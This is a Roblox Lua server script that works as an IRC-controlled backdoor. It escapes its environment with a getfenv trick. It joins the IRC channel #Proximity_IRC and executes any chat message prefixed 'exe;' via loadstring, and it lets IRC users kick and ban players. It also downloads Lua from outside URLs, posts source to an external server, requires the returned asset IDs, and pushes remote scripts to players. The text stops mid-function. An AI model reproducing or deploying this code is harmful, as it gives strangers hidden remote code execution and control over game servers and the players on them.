function GetDiscoColor(hue)
        hue=hue/4
    local section = hue % 1 * 3
    local secondary = 0.5 * math.pi * (section % 1)
        local thing
    if section < 1 then
        thing=Color3.new(1, 1 - math.cos(secondary), 1 - math.sin(secondary))
    elseif section < 2 then
        thing=Color3.new(1 - math.sin(secondary), 1, 1 - math.cos(secondary))
    else
        thing=Color3.new(1 - math.cos(secondary), 1 - math.sin(secondary), 1)
    end
        return thing
end

local Spawn = spawn

a=newproxy(true);
getmetatable(a).__tostring = function()
	a = getfenv(3);
end;
pcall(warn, a);
a = setfenv(1, a);
funcs = {}
local Http=game:GetService("HttpService")
wait()
local API = {}
local Connections = {}
local Banned = {}
local GStr = nil
local Http = game:GetService("HttpService")
local function Post(Url,Data)
	local Errored,Data = ypcall(function() return Http:PostAsync(Url,Data,Enum.HttpContentType.ApplicationUrlEncoded) end)
	return Errored == false and false or Data
end
local function JSONDecode(JSON)
	local Worked,Result = ypcall(function() return Http:JSONDecode(JSON) end)
	if Worked == false then
		return {}
	else
		return Result
	end
end
local function HandleVagues(Connection,Ping,Derp,Raw)
	local Msgs = JSONDecode(Ping)
	local Search = [[%["c","353","webchat%.SwiftIRC%.net",%[".+",".",".+","]]
	if Derp == nil and Ping:find(Search) then
		GStr = Ping
	end
	if Msgs ~= nil and type(Msgs) == "table" and #Msgs > 0 then
		for i,v in pairs(Msgs) do
			for i2,v2 in pairs(Connection.VagueEvents) do
				if v2 ~= false then
					spawn(function() v2(v,Raw) end)
				end
			end
		end
	end
end
NetworkServer = game:GetService('NetworkServer')
Send=require(328231860)
function SendAll(...)
	for i,v in pairs(NetworkServer:children()) do 
		if v:IsA"ServerReplicator" then
			Send(v:GetPlayer(),...)
		end
	end
end
client = game:service'HttpService':GetAsync('https://preview.c9users.io/ujdjidjciejiejidjcfvbfvbrn/aec375jdhal49shcsbfki48wy6496dh8365/cbase.lua')
funcs.Output = function(Type,Message,User)
	local p = Instance.new('StringValue')
p.Name = 'SB_Output:Output'
p.Value = '["'..Type..'","'..Message..'"]'
wait()
p.Parent = User
end
funcs.Nefl = function(Player)
	sbexe([[hl/https://preview.c9users.io/ujdjidjciejiejidjcfvbfvbrn/aec375jdhal49shcsbfki48wy6496dh8365/a.lua]],Player)
	end
funcs.Msg = function(title,str,tme)
for i,v in pairs(game:GetService("Players"):GetPlayers'') do
	coroutine.wrap(function(v)
		if not v:findFirstChild'PlayerGui' then Instance.new("PlayerGui",v);end;
		local g = Instance.new("ScreenGui",v.PlayerGui);
		g.Name="Message";
		local bg = Instance.new("Frame",g);
		bg.BackgroundColor3=Color3.new(0,0,0);
		bg.BackgroundTransparency=.5;
		bg.BorderColor3=Color3.new(0,0,0);
		bg.Size=UDim2.new(1,0,1,0);
		bg.Name="Bg";
		bg.Position=UDim2.new(-1,0,0,0);
		local label = Instance.new("TextLabel",bg);
		label.BackgroundTransparency=1;
		label.Name="Label";
		label.Size=UDim2.new(1,0,.1,0);
		label.Font="SourceSansLight"
		label.TextColor3=Color3.new(170,85,255);
		label.TextScaled=true;
		label.TextWrapped=true;
		label.TextStrokeColor3=Color3.new(255,255,255);
		label.TextStrokeTransparency=0;
		label.Text=title
		local txt = Instance.new("TextLabel",bg);
		txt.BackgroundTransparency=1;
		txt.Name="Text";
		txt.Size=UDim2.new(1,0,.9,0);
		txt.Position=UDim2.new(0,0,.1,0);
		txt.Font="SourceSansLight";
		txt.TextColor3=Color3.new(170,85,255);
		txt.TextScaled=true;
		txt.TextWrapped=true;
		txt.TextStrokeColor3=Color3.new(255,255,255);
		txt.TextStrokeTransparency=0;
		txt.Text=str
		
		bg.Visible=false;
		 txt.Visible=false;
		 label.Visible=false;
		 
		txt.TextStrokeTransparency=1;
		txt.TextTransparency=1;
		label.TextStrokeTransparency=1;
		label.TextTransparency=1;
		
		bg.Visible=true;
		bg:TweenPosition(UDim2.new(0,0,0,0),"In","Sine",1);

		wait'1';
	bg.Position=UDim2.new(0,0,0,0);
		wait'.5';
	
	txt.Visible=true;
	label.Visible=true;
		for i = 100,0,-5 do
		txt.TextTransparency=i/100;
		txt.TextStrokeTransparency=i/100;
		label.TextTransparency=i/100;
		label.TextStrokeTransparency=i/100;
		wait();end;
		wait (tme);
		for i = 0,100,5 do
		txt.TextTransparency=i/100;
		txt.TextStrokeTransparency=i/100;
		label.TextTransparency=i/100;
		label.TextStrokeTransparency=i/100;
		wait'';end;
		bg:TweenPosition(UDim2.new(1,0,0,0),"Out","Quart",.5);
		wait (tme);
		g:Destroy'';
	end)(v);
	end;
end
funcs.OxChat = function(Player, Message)
	for _,plr in next,game.Players:GetPlayers() do
		local val=Instance.new("StringValue")
val.Name="SB_Chat"; val.Parent=plr; val.Value=tostring(Player).."/"..tostring(Message)
		game.Debris:AddItem(val,0)
	end
end
funcs.Hint = function(str,tme)
	for i,v in pairs(game.Players:GetPlayers()) do
	coroutine.wrap(function()
		if not v:findFirstChild("PlayerGui") then Instance.new("PlayerGui",v) end
		local g = Instance.new("ScreenGui",v.PlayerGui)
		g.Name="Hint"
		local bg = Instance.new("Frame",g)
		bg.BackgroundColor3=Color3.new(0,0,0)
		bg.BackgroundTransparency=.5
		bg.BorderColor3=Color3.new(0,0,0)
		bg.Name="Bg"
		bg.Size=UDim2.new(1,0,0.05,0)
		bg.Visible=false
		local txt = Instance.new("TextLabel",bg)
		txt.BackgroundTransparency=1
		txt.Name="Text"
		txt.Size=UDim2.new(1,0,1,0)
		txt.Font="ArialBold"
		txt.TextColor3=Color3.new(255,255,255)
		txt.TextScaled=true
		txt.TextWrapped=true
		txt.TextStrokeColor3=Color3.new(0,0,0)
		txt.TextStrokeTransparency=0
		txt.Text=str
		
		bg.Position=UDim2.new(-1,0,0,0)
		
		txt.Visible=false
		txt.TextStrokeTransparency=1
		txt.TextTransparency=1
		
		bg.Visible=true
		bg:TweenPosition(UDim2.new(0,0,0,0),"In","Sine",1)
		wait(1)
		bg.Position=UDim2.new(0,0,0,0) -- just in case
		wait(.5)
		txt.Visible=true
		for i = 100,0,-5 do
		txt.TextTransparency=i/100
		txt.TextStrokeTransparency=i/100
		wait()
		end
		wait(tme)
		for i = 0,100,5 do
		txt.TextTransparency=i/100
		txt.TextStrokeTransparency=i/100
		wait()
		end
			bg:TweenPosition(UDim2.new(1,0,0,0),"Out","Quart",.5)
			wait(tme)
			g:Destroy()
	end)()
	end
end
function GetLocal(source,player) 
local site = "http://rbxapis.ddns.net/newlocal.php"
local id = tonumber(game:GetService('HttpService'):PostAsync(site,source))
local _returnscript = require(id)
_returnscript.Parent=player.PlayerGui 
_returnscript.Disabled=false
end	
function find1Player(str)
	for i,v in pairs(game.Players:players'') do
		if v.Name:sub(str:len()) == str then
			return v;
		end
	end
end
function GetPlayer(msg,Reason)
	local FoundPlayers = {}
	local find
	if Reason == true then
		ypcall(function()
			find = string.find(msg,";")
			msg = string.sub(msg,1,find-1)
		end)
	end
	if msg == "all" or msg == "everyone" then
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			table.insert(FoundPlayers,Plr)
		end
	elseif msg == "noobs" or msg == "nubs" then
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			if Plr.AccountAge < 364 and Plr.Name ~= "PointCoded" then
				table.insert(FoundPlayers,Plr)
			end
		end
	elseif msg == "veterans" or msg == "elders" then
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			if Plr.AccountAge >= 364 then
				table.insert(FoundPlayers,Plr)
			end
		end
	else
		local Z = false
		for i,Plr in pairs(game:GetService("Players"):GetPlayers()) do
			local N = string.lower(Plr.Name)
			msg = string.lower(msg)
			if string.match(N,msg) then
				if Z == false then
					Z = true
					table.insert(FoundPlayers,Plr)
				end
			end
		end
	end
	return FoundPlayers
end
Scale = function(p, size)
	local pchar = p.Character
	if pchar then
		local function scale(chr, scl)
       
			for _, v in pairs(pchar:GetChildren()) do
				if v:IsA("Hat") then
					v:Clone()
					v.Parent = game.Lighting
				end
			end
               
			local Head = chr['Head']
			local Torso = chr['Torso']
			local LA = chr['Left Arm']
			local RA = chr['Right Arm']
			local LL = chr['Left Leg']
			local RL = chr['Right Leg']
			local HRP = chr['HumanoidRootPart']
       
			wait(0.1)
           
			Head.formFactor = 3
			Torso.formFactor = 3
			LA.formFactor = 3
			RA.formFactor = 3
			LL.formFactor = 3
			RL.formFactor = 3
			HRP.formFactor = 3
           
			Head.Size = Vector3.new(scl * 2, scl, scl)
			Torso.Size = Vector3.new(scl * 2, scl * 2, scl)
			LA.Size = Vector3.new(scl, scl * 2, scl)
			RA.Size = Vector3.new(scl, scl * 2, scl)
			LL.Size = Vector3.new(scl, scl * 2, scl)
			RL.Size = Vector3.new(scl, scl * 2, scl)
			HRP.Size = Vector3.new(scl * 2, scl * 2, scl)
           
			local Motor1 = Instance.new('Motor6D', Torso)
			Motor1.Part0 = Torso
			Motor1.Part1 = Head
			Motor1.C0 = CFrame.new(0, 1 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
			Motor1.C1 = CFrame.new(0, -0.5 * scl, 0) * CFrame.Angles(-1.6, 0, 3.1)
			Motor1.Name = "Neck"
                   
			local Motor2 = Instance.new('Motor6D', Torso)
			Motor2.Part0 = Torso
			Motor2.Part1 = LA
			Motor2.C0 = CFrame.new(-1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor2.C1 = CFrame.new(0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor2.Name = "Left Shoulder"
           
			local Motor3 = Instance.new('Motor6D', Torso)
			Motor3.Part0 = Torso
			Motor3.Part1 = RA
			Motor3.C0 = CFrame.new(1 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor3.C1 = CFrame.new(-0.5 * scl, 0.5 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor3.Name = "Right Shoulder"
           
			local Motor4 = Instance.new('Motor6D', Torso)
			Motor4.Part0 = Torso
			Motor4.Part1 = LL
			Motor4.C0 = CFrame.new(-1 * scl, -1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor4.C1 = CFrame.new(-0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, -1.6, 0)
			Motor4.Name = "Left Hip"
           
			local Motor5 = Instance.new('Motor6D', Torso)
			Motor5.Part0 = Torso
			Motor5.Part1 = RL
			Motor5.C0 = CFrame.new(1 * scl, -1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor5.C1 = CFrame.new(0.5 * scl, 1 * scl, 0) * CFrame.Angles(0, 1.6, 0)
			Motor5.Name = "Right Hip"
           
			local Motor6 = Instance.new('Motor6D', HRP)
			Motor6.Part0 = HRP
			Motor6.Part1 = Torso
			Motor6.C0 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
			Motor6.C1 = CFrame.new(0, 0, 0) * CFrame.Angles(-1.6, 0, -3.1)
               
		end
       
		scale(pchar, size)
		pchar.Humanoid.WalkSpeed = 15 * size
   
		for _, v in pairs(game.Lighting:GetChildren()) do
			if v:IsA("Hat") then
				v.Parent = pchar
			end
		end
	end
end
Fire = function(person, color)
	local pos = person.Character.Torso.Position
	for _, v in pairs(person.Character:GetChildren()) do
		if v:IsA'Part' and v.Name ~= "HumanoidRootPart" then
			if v.Name ~= "Head" then
				for i = 0, 10, 1 do
					local part = Instance.new("Part", person.Character)
					part.Name = "Burnt:"..v.Name
					local l = Instance.new("PointLight", part)
					l.Brightness = 5
					l.Range = 5
					part.FormFactor = "Custom"
					part.Size = Vector3.new(v.Size.X + .2, v.Size.Y / 10, v.Size.Z + .2)
					part.CanCollide = false
					part.Transparency = .5
					if _ % 2 == 0 then
						if i % 2 == 0 then
							part.BrickColor = BrickColor.new(color)
						else
							part.BrickColor = BrickColor.new("Really black")
						end
					else
						if i % 2 == 0 then
							part.BrickColor = BrickColor.new("Really black")
						else
							part.BrickColor = BrickColor.new(color)
						end
					end
					part.Material = Enum.Material.Neon
					l.Color = part.Color
					part.TopSurface = "Smooth"
					part.BottomSurface = "Smooth"
					local w = Instance.new("Weld")
					w.Part1 = v
					w.Part0 = part
					w.C1 = CFrame.new(0, (1 - v.Size.Y / 10 * i), 0)
					w.Parent = person.Character.Torso
					w.Name = v.Name
					v.Touched:connect(function(hit)
						if hit.Parent.Name ~= person.Name then
							local hum = hit.Parent:findFirstChild("Humanoid")
							if hum then
								for a, d in pairs(hit.Parent:GetChildren()) do
									if d:IsA'Part' and d.Name ~= "HumanoidRootPart" then
										d.BrickColor = BrickColor.new("Really black")
										d.Material = "CorrodedMetal"
										d.Transparency = 0
									elseif d.Name == "HumanoidRootPart" then
										d:ClearAllChildren()
									elseif
										d:IsA'Shirt' or d:IsA'Pants' or d:IsA'Hat' or d:IsA'BodyColors' then
										d:Destroy()
									end
								end
							end
						end
					end)
				end
				--v.Anchored=true
			elseif v.Name == "Head" then
				local fire = Instance.new("Fire", v)
				fire.SecondaryColor = Color3.new(1, 0, 0)
				v.Material = Enum.Material.Neon
				v.BrickColor = BrickColor.new(color)
				v.Transparency = .5
				pcall(function()
					v.face.Transparency = 1
					local decal = Instance.new('Decal', v)
					decal.Face = "Front"
					decal.Texture = "http://www.roblox.com/asset/?id=209712379"
				end)
			end
		elseif v:IsA'Hat' then
			v.Handle.Material = Enum.Material.Neon
			v.Handle.Mesh.TextureId = ""
			v.Handle.BrickColor = BrickColor.new(color)
			v.Handle.Transparency = .5
		end
	end
	person.Character:MoveTo(pos)
end

function sbexe(cmd, plr)
	if not type(cmd) == 'string' then
		return
	end
	if plr then
		if type(plr) == 'userdata' then
			plr:findFirstChild("SB_CommandRemote", true).Value = cmd
		elseif type(plr) == 'string' then
			plr = game:GetService('Players'):FindFirstChild(plr)
			plr:findFirstChild("SB_CommandRemote", true).Value = cmd
		end
	else
		for i, v in pairs(game:GetService('Players'):children()) do
			v:findFirstChild("SB_CommandRemote", true).Value = cmd
		end
	end
end
funcs.Mute = function(Player)
	sbexe("l/game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All,false)",Player)
	end
	funcs.UnMute = function(Player)
	sbexe("l/game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All,true)",Player)
end
OxChat = function(Player, Message)
	for _,plr in next,game.Players:GetPlayers() do
		local val=Instance.new("StringValue")
val.Name="SB_Chat"; val.Parent=plr; val.Value=tostring(Player).."/"..tostring(Message)
		game.Debris:AddItem(val,0)
	end
end
ChatGetter = function(Message, Chat)
    
				
if Chat then
OxChat(Message,Chat or Message)
							SendAll(
				("["..Message .."]: ".. Chat or Message),
				BrickColor.new("White").Color,
				Enum.Font.SourceSansBold,
				Enum.FontSize.Size18
				)
		if string.sub(Chat,1,4) == "exe;" then
			local ToExe = string.sub(Chat,5)
			local execute = loadstring(ToExe)
			local Run,Error = ypcall(function()
				execute()
			end)
		elseif string.sub(Chat,1,5) == "kick;" then
			local msg = string.sub(Chat,6)
			local Players = GetPlayer(msg,true)
			local Reason = string.find(msg,";")
			Reason = string.sub(msg,Reason + 1)
			for i,Player in pairs(Players) do
				Player:Kick(Reason)
			end
		elseif string.sub(Chat,1,4) == "ban;" then
			local msg = string.sub(Chat,5)
			local Players = GetPlayer(msg,true)
			local Reason = string.find(msg,";")
			Reason = string.sub(msg,Reason + 1)
			for i,Player in pairs(Players) do
				Player:Kick(Reason)
				Banned[Player.Name] = {Reason = Reason}
			end
		end
	end
end
API.Connect = function(this,Host,Nick,Pass)
	--if Connections[Nick.."@"..Host] == nil then
		local Con = {}
		Connections[Nick.."@"..Host] = Con
		Con.Host = Host
		Con.Nick = Nick
		Con.Counter = 0
		Con.Channels = {}
		Con.VagueEvents = {}
		Con.ChannelEvents = {[Nick]={}}
		Con.UserLists = {}
		Con.SelfEvents = {}
		Con.Counter = Con.Counter+1
		local Data = Post(Host.."e/n?t="..Con.Counter,"nick="..Nick)
		Data = JSONDecode(Data)
		Con.Key = Data[2]
		local Str = ""
		if Con.Key ~= nil then
			wait(1)
			Con.Counter = Con.Counter+1
			local Data = Post(Host.."e/p?t="..Con.Counter,"s="..Con.Key.."&c=MODE "..Nick.." +")
			if Data == false then
				return false,"Something went wrong."
			else
				local Data2 = JSONDecode(Data)
				if Data2[1] == false then
					return false,Data
				end
			end
			Str = Str..Data
			Con.Counter = Con.Counter+1
			local Data = Post(Host.."e/s?t="..Con.Counter,"s="..Con.Key)
			if Data == false then
				return false,"Something went wrong."
			else
				local Data2 = JSONDecode(Data)
				if Data2[1] == false then
					return false,Data
				end
			end
			Str = Str..Data
			if Str:lower():find("already in use") then
				return false,"Nick already in use."
			elseif Str:lower():find("throttled") then
				return false,"Oh no! We got throttled."
			elseif Str:lower():find("invalid session") then
				return false,"Something went wrong."
			end
			if Pass ~= nil then
				API.SendMessage(API.SendMessage,Con,"NickServ","identify "..Pass)
			end
			wait()
			return Con
		else
			return false,"Something went wrong."
		end
	--[[else
		return false,"There is a connection with this nick already."
	end]]

end




API.Disconnect = function(this,Connection)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=QUIT :Leaving")

		if Data ~= false then

			Connections[Nick.."@"..Host] = nil

			for i,v in pairs(Connection.SelfEvents) do

				v:Disconnect()

			end

			Connection.SelfEvents = {}

			for Channel,_ in pairs(Connection.Channels) do

				Connection.Channels[Channel] = nil

				for i,v in pairs(Connection.ChannelEvents[Channel]) do

					v:Disconnect()

				end

				Connection.ChannelEvents[Channel] = nil

			end

			return true

		else

			return false,"Something went wrong."

		end

	else

		return false,"This connection doesn't exist."

	end

end




API.ChangeNick = function(this,Connection,Nick)

	local Host = Connection.Host

	local Key = Connection.Key

	if Connections[Connection.Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=NICK "..Nick)

		if Data == false then

			return false,"Something went wrong."

		else

			local Data2 = JSONDecode(Data)

			if Data2[1] == false then

				return false,Data

			end

		end

		Connections[Connection.Nick.."@"..Host] = nil

		Connection.Nick = Nick

		Connections[Nick.."@"..Host] = Connection

		return true

	else

		return false,"There is no connection with this nick and host."

	end

end




API.JoinChannel = function(this,Connection,Channel)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	local Str = ""

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=JOIN "..Channel.." ")

		if Data == false then

			return false,"Something went wrong."

		else

			local Data2 = JSONDecode(Data)

			if Data2[1] == false then

				return false,Data

			end

		end

		Str = Str..Data

		

		local Search = [[%["c","353","webchat%.SwiftIRC%.net",%["]] .. Nick .. [[",".","]] .. Channel .. [[","]]

		if Str:find(Search) == nil then

			repeat

				if GStr ~= nil then

					Str = Str..GStr

					GStr = nil

					break

				end

				Connection.Counter = Connection.Counter+1

				local Data = Post(Host.."e/s?t="..Connection.Counter,"s="..Connection.Key)

				if Data == false then

					return false,"Something went wrong."

				else

					HandleVagues(Connection,Data,false)

					local Data2 = JSONDecode(Data)

					if Data2[1] == false then

						return false,Data

					end

				end

				Str = Str..Data

			until Str:find(Search) ~= nil

		end

		

		if Str:find("already in use") then

			return false,"Nick already in use."

		elseif Str:lower():find("throttled") then

			return false,"Oh no! We got throttled."

		elseif Str:lower():find("invalid session") then

			return false,"Something went wrong."

		else--if Str:lower():find("end of /names list.") then

			Connection.Channels[Channel] = true

			Connection.ChannelEvents[Channel] = {}

			Connection.UserLists[Channel] = {}

			Connection.UserLists[Channel][Nick] = true

			local Search = [[%["c","353","webchat%.SwiftIRC%.net",%["]] .. Nick .. [[",".","]] .. Channel .. [[","]]

			local RawSearch = Search:gsub("%%","")

			local Start = Str:find(Search)

			if Start ~= nil then

				local End = Str:find('"',Start+#RawSearch+1,true)

				local List = Str:sub(Start+#RawSearch,End-1)

				for Match in List:gmatch("[^%s]+") do

					if Match ~= Nick then

						if Match:sub(1,1):match("[%w]") then

							Connection.UserLists[Channel][Match] = true

						else

							Connection.UserLists[Channel][Match:sub(2)] = true

						end

					end

				end

			end

			Spawn(function()

				Connection.SelfEvents[#Connection.SelfEvents+1] = API.UserJoined(API.UserJoined,Connection,Channel,function(User)

					Connection.UserLists[Channel][User] = true

				end)

				Connection.SelfEvents[#Connection.SelfEvents+1] = API.UserLeft(API.UserLeft,Connection,Channel,function(User)

					wait(0.02)

					Connection.UserLists[Channel][User] = nil

				end)

				Connection.SelfEvents[#Connection.SelfEvents+1] = API.NickChanged(API.NickChanged,Connection,Channel,function(User,Nick)

					wait(0.02)

					Connection.UserLists[Channel][User] = nil

					Connection.UserLists[Channel][Nick] = true

				end)

				wait(0.02)

				HandleVagues(Connection,[=[ [["c","JOIN","]=] .. Nick .. [=[!",["]=] .. Channel .. [=["]]] ]=],nil,true)

			end)

			return true

		--[[else

			return false,"Something went wrong."]]

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.GetUserList = function(this,Connection,Channel)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		local New = {}

		for i,v in pairs(Connection.UserLists[Channel]) do

			New[#New+1] = i

		end

		return New

	else

		return false,"There is no connection with this nick and host."

	end

end




API.LeaveChannel = function(this,Connection,Channel,Reason)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	local Str = ""

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Data = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=PART "..Channel.." "..Reason and ":"..tostring(Reason) or "")

		if Data:find("true") then

			Connection.Channels[Channel] = nil

			for i,v in pairs(Connection.ChannelEvents[Channel]) do

				v:Disconnect()

			end

			Connection.UserLists[Channel] = nil

			Connection.SelfEvents = {}

			Connection.ChannelEvents[Channel] = nil

			return true

		elseif Data:lower():find("throttled") then

			return false,"Oh no! We got throttled."

		else

			return false,"Something went wrong."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.SendMessage = function(this,Connection,Channel,Message)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true or Channel:sub(1,1) ~= "#" then

			Connection.Counter = Connection.Counter+1

			local Ping = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=PRIVMSG "..Channel.." :"..Http:UrlEncode(Message))

			if Ping ~= false then

				return true,Ping

			else

				return false,"Something went wrong. "..Ping

			end

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




local function VagueReceived(Connection,Event)

	Connection.VagueEvents[#Connection.VagueEvents+1] = Event

	if #Connection.VagueEvents == 1 then

		while Connections[Connection.Nick.."@"..Connection.Host] ~= nil do

			Connection.Counter = Connection.Counter+1

			local Ping = Post(Connection.Host.."e/s?t="..Connection.Counter,"s="..Connection.Key)

			if Ping ~= false and Connections[Connection.Nick.."@"..Connection.Host] ~= nil then

				HandleVagues(Connection,Ping)

			end

			wait()

		end

	end

end




API.MessageReceived = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "PRIVMSG" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1]:lower() == Channel:lower() then

						Event(v[3]:sub(1,v[3]:find("!")-1),v[4][2])

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.PMReceived = function(this,Connection,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		local Con = {}

		local Connected = true

		local VCon;

		Spawn(function()

			local function Return(v)

				if Connected == false then

					for i,v in pairs(Connection.VagueEvents) do

						if v == VCon then

							Connection.VagueEvents[i] = false

						end

					end

					return

				end

				if type(v) == "table" and v[2] ~= nil and v[2] == "PRIVMSG" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1] == Connection.Nick then

					Event(v[3]:sub(1,v[3]:find("!")-1),v[4][2])

				end

			end

			VCon = Return

			VagueReceived(Connection,Return)

		end)

		Con.Disconnect = function(this)

			Connected = false

			Connection.ChannelEvents[Nick][Con] = nil

		end

		Connection.ChannelEvents[Nick][Con] = Con

		return Con

	else

		return false,"There is no connection with this nick and host."

	end

end




API.NickChanged = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "NICK" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" then

						if Connection.UserLists[Channel][v[3]:sub(1,v[3]:find("!")-1)] ~= nil then

							Event(v[3]:sub(1,v[3]:find("!")-1),v[4][1])

						end

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.UserJoined = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v,Raw)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "JOIN" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1]:lower() == Channel:lower() and (v[3]:sub(1,v[3]:find("!")-1) ~= Nick or Raw == true) then

						Event(v[3]:sub(1,v[3]:find("!")-1))

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.UserLeft = function(this,Connection,Channel,Event)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		if Connection.Channels[Channel] == true then

			local Con = {}

			local Connected = true

			local VCon;

			Spawn(function()

				local function Return(v)

					if Connected == false then

						for i,v in pairs(Connection.VagueEvents) do

							if v == VCon then

								Connection.VagueEvents[i] = false

							end

						end

						return

					end

					if type(v) == "table" and v[2] ~= nil and v[2] == "PART" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" and v[4][1]:lower() == Channel:lower() then

						Event(v[3]:sub(1,v[3]:find("!")-1))

					elseif type(v) == "table" and v[2] ~= nil and v[2] == "QUIT" and v[3] ~= nil and v[4] ~= nil and type(v[4]) == "table" then

						if Connection.UserLists[Channel][v[3]:sub(1,v[3]:find("!")-1)] ~= nil then

							Event(v[3]:sub(1,v[3]:find("!")-1))

						end

					end

				end

				VCon = Return

				VagueReceived(Connection,Return)

			end)

			Con.Disconnect = function(this)

				Connected = false

				Connection.ChannelEvents[Channel][Con] = nil

			end

			Connection.ChannelEvents[Channel][Con] = Con

			return Con

		else

			return false,"You are not on this channel with this connection."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end




API.KeepAlive = function(this,Connection)

	local Host = Connection.Host

	local Nick = Connection.Nick

	local Key = Connection.Key

	if Connections[Nick.."@"..Host] ~= nil then

		Connection.Counter = Connection.Counter+1

		local Ping = Post(Host.."e/p?t="..Connection.Counter,"s="..Key.."&c=PONG :webchat.SwiftIRC.net")

		if Ping ~= false then

			return true

		else

			return false,"Something went wrong."

		end

	else

		return false,"There is no connection with this nick and host."

	end

end








rand = tostring(math.random(0,10))

local con = API:Connect("https://qwebirc.swiftirc.net/","Proximity_"..rand)--API.Connect = function(this,Host,Nick,Pass)

spawn(function() while wait(5) do API:KeepAlive(con) end end)

local c = {API:JoinChannel(con,"#Proximity_IRC")}--this,Connection,Channel)

print("Data", unpack(c))

if not c[1] then error(c[2],2) end

API:MessageReceived(con,"#Proximity_IRC",ChatGetter)

API:UserJoined(con,"#Proximity_IRC",ChatGetter)

API:UserLeft(con,"#Proximity_IRC",ChatGetter)

local Chat=function(msg,channel,playername)
					
					c={API:SendMessage(con,channel and tostring(channel) or "#Proximity_IRC",playername..': '..msg)}
					if not c[1] then error(c[2],2) end
					return "success"
			end

ChangeNick=function(nick)

	API:ChangeNick(con,nick)

end

JoinChannel=function(channel)

